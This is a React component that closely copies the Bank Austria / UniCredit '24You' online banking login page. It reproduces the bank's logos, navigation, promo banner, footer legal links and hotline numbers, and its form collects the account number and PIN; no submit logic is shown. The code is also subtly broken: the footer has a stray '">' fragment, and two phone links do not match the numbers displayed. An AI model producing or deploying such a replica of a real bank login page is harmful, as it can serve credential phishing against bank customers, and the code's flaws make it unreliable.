import { useState } from "react";
import {
  Menu, Wallet, CreditCard, PiggyBank, Home, TrendingUp, BarChart3
} from "lucide-react";
import deutschActive from "@/assets/deutschactive.png";
import deutschInactive from "@/assets/deutschinactive.png";
import englishActive from "@/assets/englishactive.png";
import englishInactive from "@/assets/englishinactive.png";
import promoBg from "@/assets/bankaustria_promo_bg.png";
import unicreditLogo from "@/assets/unicredit.png";
import logo from "@/assets/logo-bank-austria.svg";
import iconPrivatkunden from "@/assets/icon-privatkunden.png";
import iconFirmenkunden from "@/assets/icon-firmenkunden.png";
import iconPrivatebanking from "@/assets/icon-privatebanking.png";
import iconUeberuns from "@/assets/icon-ueberuns.png";
import iconSicherheit from "@/assets/sicherheitsinformationen.png";
import iconSicherheitscenter from "@/assets/sicherheitscenter.png";
import iconHotline from "@/assets/internetbanking_hotline.png";
import iconFaq from "@/assets/faq.png";
import iconCookie from "@/assets/cookie_policy.png";

const navItems = [
  { label: "Privatkunden", icon: iconPrivatkunden },
  { label: "Firmenkunden", icon: iconFirmenkunden },
  { label: "Private Banking", icon: iconPrivatebanking },
  { label: "Über uns", icon: iconUeberuns },
];

const sidebarItems = [
  { icon: Menu, label: "MENÜ" },
  { icon: Wallet, label: "GIROKONTEN" },
  { icon: CreditCard, label: "KREDITKARTEN" },
  { icon: PiggyBank, label: "SPARPRODUKTE" },
  { icon: Home, label: "FINANZIERUNG" },
  { icon: TrendingUp, label: "WERTPAPIERE" },
  { icon: BarChart3, label: "BÖRSEN & MÄRKTE" },
];

const BankAustria = () => {
  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [activeLang, setActiveLang] = useState<"de" | "en">("de");

  return (
    <div
      className="min-h-screen flex"
      style={{ fontFamily: "'UniCredit', sans-serif" }}
    >
      {/* Fixed Sidebar 80px */}
      <aside
        className="fixed left-0 top-0 h-full flex flex-col z-50"
        style={{ width: "80px", backgroundColor: "#1a1a1a" }}
      >
        {sidebarItems.map(({ icon: Icon, label }) => (
          <a
            key={label}
            href="#"
            className="flex flex-col items-center justify-center py-3 border-l-[3px] border-transparent hover:border-white transition-colors group"
            style={{ height: "80px", borderBottom: "1px solid rgba(102,102,102,0.16)" }}
          >
            <Icon size={22} className="text-[#bebebe] group-hover:text-white transition-colors" />
            <span className="text-[#bebebe] group-hover:text-white text-[9px] text-center mt-1 leading-tight uppercase font-medium transition-colors">
              {label}
            </span>
          </a>
        ))}
      </aside>

      {/* Right Content Area */}
      <div className="flex-1 flex flex-col" style={{ marginLeft: "80px" }}>
        {/* Header */}
        <header className="flex" style={{ height: "80px" }}>
          {/* White logo area */}
          <div
            className="flex items-center px-1 flex-shrink-0"
            style={{ backgroundColor: "#fff", width: "220px" }}
          >
            <img src={logo} alt="Bank Austria" style={{ height: "76px" }} />
          </div>
          {/* Red nav area */}
          <div
            className="flex-1 flex items-center justify-center gap-10"
            style={{ backgroundColor: "#e2001a" }}
          >
            {navItems.map(({ label, icon }) => (
              <a
                key={label}
                href="#"
                className="flex flex-col items-center gap-1 transition-opacity hover:opacity-80"
              >
                <img src={icon} alt={label} className="h-8 w-8 object-contain" />
                <span className="text-white text-xs font-bold uppercase tracking-wide">
                  {label}
                </span>
              </a>
            ))}
          </div>
        </header>

        {/* Main Content */}
        <main className="flex-1 px-10 pt-14 pb-8" style={{ backgroundColor: "#fff" }}>
          {/* 24You */}
          <div className="mb-6 text-center">
            <span className="text-4xl" style={{ color: "#e2001a", fontFamily: "'UniCreditMedium', sans-serif" }}>24You</span>
          </div>

          {/* Login Form */}
          <div className="max-w-md mx-auto">
            <div className="mb-4">
              <input
                type="text"
                value={verfueger}
                onChange={(e) => setVerfueger(e.target.value)}
                placeholder="Verfügernummer"
                className="w-full px-4 py-3 text-base outline-none rounded-sm text-center"
style={{ border: "1px solid #ccc" }}
              />
            </div>

            <div className="mb-4">
              <input
                type="password"
                value={pin}
                onChange={(e) => setPin(e.target.value)}
                placeholder="PIN"
                className="w-full px-4 py-3 text-base outline-none rounded-sm text-center"
                style={{ border: "1px solid #ccc" }}
              />
            </div>

            <div className="mb-4">
              <a
                href="#"
                className="inline-block text-sm font-medium transition-colors"
                style={{
                  color: "#00aed0",
                  textDecoration: "underline",
                  textDecorationColor: "black",
                  textDecorationThickness: "1.5px",
                  textUnderlineOffset: "1px",
                }}
              >
                PIN vergessen oder Verfügernummer gesperrt?
              </a>
            </div>

            <div className="flex justify-center mb-6">
              <button
                className="px-16 py-3 text-white font-semibold text-base rounded-sm hover:opacity-90 transition-opacity"
                style={{ backgroundColor: "#00aed0" }}
              >
                LOGIN
              </button>
            </div>

            <div className="flex items-center justify-center gap-4">
              {[
                { lang: "de" as const, active: deutschActive, inactive: deutschInactive, label: "Deutsch" },
                { lang: "en" as const, active: englishActive, inactive: englishInactive, label: "English" },
              ].map(({ lang, active, inactive, label }) => {
                const isActive = activeLang === lang;
                return (
                  <button
                    key={lang}
                    onClick={() => setActiveLang(lang)}
                    className="flex flex-col items-center gap-1 bg-transparent border-none cursor-pointer"
                  >
                    <div
                      className="rounded-full overflow-hidden"
                      style={{
                        width: 46,
                        height: 46,
                        border: isActive ? "2px solid #00aed0" : "2px solid transparent",
                      }}
                    >
                      <img
                        src={active}
                        alt={label}
                        className="w-full h-full object-cover"
                        style={{ display: isActive ? "block" : "none" }}
                      />
                      <img
                        src={inactive}
                        alt={label}
                        className="w-full h-full object-cover"
                        style={{ display: isActive ? "none" : "block" }}
                      />
                    </div>
                    <span
                      className="text-xs font-semibold"
                      style={{ color: isActive ? "#00aed0" : "#999" }}
                    >
                      {label}
                    </span>
                  </button>
                );
              })}
            </div>
          </div>
        </main>

        {/* Promo Banner */}
        <div
          className="relative w-full flex items-center"
          style={{
            backgroundImage: `url(${promoBg})`,
            backgroundSize: "cover",
            backgroundPosition: "center",
            height: "300px",
          }}
        >
          <div className="absolute inset-0" style={{ backgroundColor: "rgba(0,0,0,0.35)" }} />
          <div className="relative z-10 px-12 max-w-xl">
            <p className="text-white text-5xl font-normal mb-2">Lässt sich einrichten</p>
            <p className="text-white text-xl font-bold mb-4">
              Jetzt von Topkonditionen* unserer Wohnoffensive<br />profitieren.
            </p>
            <a
              href="https://www.bankaustria.at/wohnoffensive"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-block px-6 py-2.5 text-white font-semibold text-sm tracking-wider hover:opacity-90 transition-opacity"
              style={{ backgroundColor: "#00aed0" }}
            >
              MEHR ERFAHREN
            </a>
          </div>
        </div>
        <div className="w-full px-10 py-8 text-sm" style={{ color: "#666", backgroundColor: "#f5f5f5" }}>
          *Exklusiv für neue oder bestehende Bank Austria Girokontokund:innen – vorbehaltlich positiver Kreditentscheidung. Aktionsbedingungen unter bankaustria/wohnoffensive.jsp
        </div>

        {/* Footer Icons */}
        <div className="flex justify-center gap-8 py-8" style={{ backgroundColor: "#e5e5e5" }}>
          {[
            { img: iconSicherheit, label: "Sicherheits\ninformationen", href: "https://www.bankaustria.at/sicherheit" },
            { img: iconSicherheitscenter, label: "Sicherheitscenter\n+43 (0) 50505 26105", href: "tel:+43505052610" },
            { img: iconHotline, label: "Internetbanking Hotline\n+43 (0) 50505 26100", href: "tel:+4350505261005" },
            { img: iconFaq, label: "FAQ", href: "https://www.bankaustria.at/faq" },
            { img: iconCookie, label: "Cookie Policy", href: "https://www.bankaustria.at/cookie-policy" },
          ].map(({ img, label, href }) => (
            <a
              key={label}
              href={href}
              target="_blank"
              rel="noopener noreferrer"
              className="flex flex-col items-center gap-2"
            >
              <img src={img} alt={label} className="h-7 w-7 object-contain" />
              <span className="text-xs text-center whitespace-pre-line" style={{ color: "#333" }}>
                {label}
              </span>
            </a>
          ))}
        </div>

        {/* Footer */}
        <footer className="w-full py-10 flex flex-col items-center text-white text-sm" style={{ backgroundColor: "#666666" }}>
          <div className="flex items-center gap-4 mb-3">">
            <a href="http://www.bankaustria.at/" target="_blank" rel="noopener noreferrer" className="hover:underline">UniCredit Bank Austria AG</a>
            <span className="opacity-60">|</span>
            <a href="http://www.bankaustria.at/rechtliches-impressum.jsp" target="_blank" rel="noopener noreferrer" className="hover:underline">Impressum</a>
            <span className="opacity-60">|</span>
            <a href="http://www.bankaustria.at/rechtliches-agb.jsp" target="_blank" rel="noopener noreferrer" className="hover:underline">AGB</a>
            <span className="opacity-60">|</span>
            <a href="http://www.bankaustria.at/rechtliches-datenschutz.jsp" target="_blank" rel="noopener noreferrer" className="hover:underline">Datenschutzerklärung</a>
          </div>
          <p className="mb-6">© 2026 UniCredit Bank Austria AG</p>
          <img src={unicreditLogo} alt="UniCredit" className="h-8 object-contain" />
        </footer>
      </div>
    </div>
  );
};

export default BankAustria;
